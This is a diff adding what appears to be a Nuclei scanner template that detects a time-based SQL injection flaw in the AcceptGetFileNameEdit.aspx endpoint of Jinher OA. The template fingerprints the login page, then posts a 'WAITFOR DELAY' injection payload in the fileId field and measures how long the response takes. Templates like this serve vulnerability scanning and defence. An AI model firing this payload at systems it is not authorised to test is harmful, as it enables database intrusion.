@@ -1,0 +1,49 @@
+id: poc-yaml-jinher-acceptgetfilenameedit-aspx-sqli
+
+info:
+  name: 金和OA AcceptGetFileNameEdit.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-login-page
+    method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "JHSoft"
+
+  - id: sqli-detection
+    method: POST
+    path:
+      - "{{BaseURL}}/c6/Jhsoft.Web.AcceptAip/AcceptGetFileNameEdit.aspx/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "fileId=-1)WAITFOR DELAY '0:0:{{t1}}'--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: dsl
+        dsl:
+          - duration > t1
+          - duration < t2
